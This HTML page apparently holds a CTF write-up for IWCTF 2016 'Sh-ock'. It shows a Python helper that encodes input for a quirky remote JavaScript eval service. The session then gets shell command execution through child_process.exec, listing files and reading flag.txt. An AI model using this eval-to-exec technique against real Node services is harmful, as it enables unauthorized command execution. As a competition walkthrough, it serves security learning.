@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>IWCTF 2016 - Sh-ock | kileak</title>
+
+
+
+
+
+<meta name="description" content="IWCTF 2016 - Sh-ock">
+
+
+<meta name="keywords" content="IWCTF">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2016/IWCTF-2016-Shock/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">IWCTF 2016 - Sh-ock</h1>
+      <p class="post-meta">Feb 22, 2016</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>This is some kind of weird thing. I am sh-ocked.
+<!--break--></p>
+
+  <p>Service: 188.166.133.53:12589</p>
+</blockquote>
+
+<p>After connecting to the specified service, we’ll get a prompt looking like a shell at first.</p>
+
+<p>But after trying some commands, it gets obvious, that this ain’t your normal shell, and it also has an awkward way of reading input.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ nc 188.166.133.53 12589
+Welcome and have fun!
+$ls
+[ReferenceError: l is not defined]
+$abcdefg
+[ReferenceError: fdb is not defined]</code></pre></figure>
+
+<p>The error message reveals, that our input gets parsed backwards and it only reads every second character.</p>
+
+<p>Adapting to this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$l.a.v.e.
+[Function: eval]</code></pre></figure>
+
+<p>It seems to be some javascript interpreter. To make it a bit easier to communicate with the service, I wrote a (quick&amp;dirty) python script, which reverses the input and adds the needed placeholders. It then occured, that the longer our command is, the more placeholders were needed (count of dots found by empirical analysis ;-))</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">BANNER</span> <span class="o">=</span> <span class="s">"Welcome and have fun!</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">s</span>
+	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"188.166.133.53"</span><span class="p">,</span><span class="mi">12589</span><span class="p">))</span>
+	<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">BANNER</span><span class="p">))</span>
+	<span class="k">print</span> <span class="n">banner</span>
+
+<span class="k">def</span> <span class="nf">obfuscate</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+	<span class="n">rev</span> <span class="o">=</span> <span class="n">cmd</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">rev</span><span class="p">:</span>
+		<span class="n">res</span> <span class="o">+=</span> <span class="n">ch</span>
+
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">+=</span> <span class="s">"."</span>
+		<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">+=</span> <span class="s">".."</span>
+		<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">8</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">+=</span> <span class="s">"..."</span>
+		<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">9</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">+=</span> <span class="s">"...."</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">res</span> <span class="o">+=</span> <span class="s">"....."</span>
+	
+	<span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">execCmd</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">s</span>
+	<span class="nb">input</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">obfuscate</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+	<span class="k">print</span> <span class="s">"Cmd: %s"</span> <span class="o">%</span> <span class="n">cmd</span>
+	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+	<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+	<span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+	<span class="k">print</span> <span class="s">"Response: %s"</span> <span class="o">%</span> <span class="n">response</span>
+
+<span class="n">connect</span><span class="p">()</span>
+
+<span class="n">prompt</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">execCmd</span><span class="p">()</span></code></pre></figure>
+
+<p>With this out of the way, we can start to find a way to exploit this thing.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python comm.py 
+Welcome and have fun!
+
+$sys=require('sys')
+Cmd: ).....'.....s.....y.....s.....'.....(.....e.....r.....i.....u.....q.....e.....r.....=.....s.....y.....s.....
+
+Response: { format: [Function],
+  deprecate: [Function],
+  debuglog: [Function],
+  inspect: 
+   { [Function: inspect]
+[SNIP]
+  _exceptionWithHostPort: [Function] }
+
+$exec=require('child_process').exec
+Cmd: c.....e.....x.....e...........).....'.....s.....s.....e.....c.....o.....r.....p....._.....d.....l.....i.....h.....c.....'.....(.....e.....r.....i.....u.....q.....e.....r.....=.....c.....e.....x.....e.....
+
+Response: [Function]
+
+$foo=exec("ls -la",function(error,stdout,stdin){sys.print(stdout)})
+Cmd: ).....}.....).....t.....u.....o.....d.....t.....s.....(.....t.....n.....i.....r.....p...........s.....y.....s.....{.....).....n.....i.....d.....t.....s.....,.....t.....u.....o.....d.....t.....s.....,.....r.....o.....r.....r.....e.....(.....n.....o.....i.....t.....c.....n.....u.....f.....,.....".....a.....l.....-..... .....s.....l.....".....(.....c.....e.....x.....e.....=.....o.....o.....f.....
+
+Response: ChildProcess {
+  domain: null,
+  _events: 
+   { close: [Function: exithandler],
+     error: [Function: errorhandler] },
+  _eventsCount: 2,
+  _maxListeners: undefined,
+  _closesNeeded: 3,
+  _closesGot: 0,
+  connected: false,
+  signalCode: null,
+  exitCode: null,
+  killed: false,
+  spawnfile: '/bin/sh',
+  _handle: Process { owner: [Circular], onexit: [Function], pid: 28225 },
+  spawnargs: [ '/bin/sh', '-c', 'ls -la' ],
+  pid: 28225,
+[SNIP]
+
+$foo()
+Cmd: )..(..o..o..f..
+
+Response: wHalfOpen: false,
+     destroyed: false,
+     bytesRead: 0,
+     _bytesDispatched: 0,
+     _sockname: null,
+     _writev: null,
+     _pendingData: null,
+     _pendingEncoding: '' },
+[SNIP]
+       _pendingEncoding: '' } ] }
+$total 16
+drwxr-x---  2 root exp90 4096 Feb 21 03:23 .
+drwxr-xr-x 14 root exp90 4096 Feb 11 12:19 ..
+-rw-r--r--  1 root exp90   24 Feb 11 18:23 flag.txt
+-rw-r--r--  1 root exp90 1011 Feb 11 18:23 task.js
+[TypeError: foo is not a function]
+$</code></pre></figure>
+
+<p>There it is, let’s grab it and finish this…</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$foo=exec("cat flag.txt",function(error,stdout,stdin){sys.print(stdout)})
+Cmd: ).....}.....).....t.....u.....o.....d.....t.....s.....(.....t.....n.....i.....r.....p...........s.....y.....s.....{.....).....n.....i.....d.....t.....s.....,.....t.....u.....o.....d.....t.....s.....,.....r.....o.....r.....r.....e.....(.....n.....o.....i.....t.....c.....n.....u.....f.....,.....".....t.....x.....t...........g.....a.....l.....f..... .....t.....a.....c.....".....(.....c.....e.....x.....e.....=.....o.....o.....f.....
+
+Response: ChildProcess {
+  domain: null,
+[SNIP]
+
+$foo()
+Cmd: )..(..o..o..f..
+
+Response:   allowHalfOpen: false,
+     destroyed: false,
+     bytesRead: 0,
+[SNIP]
+       _pendingEncoding: '' } ] }
+$IW{Shocked-for-nothing!}[TypeError: foo is not a function]</code></pre></figure>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">$IW{Shocked-for-nothing!}</code></p>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=IWCTF 2016 - Sh-ock&amp;url=https://kileak.github.io/ctf/2016/IWCTF-2016-Shock/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2016/IWCTF-2016-Shock/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2016/IWCTF-2016-Shock';
+        var disqus_title = 'IWCTF 2016 - Sh-ock';
+        var disqus_url = 'https://kileak.github.io/ctf/2016/IWCTF-2016-Shock';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
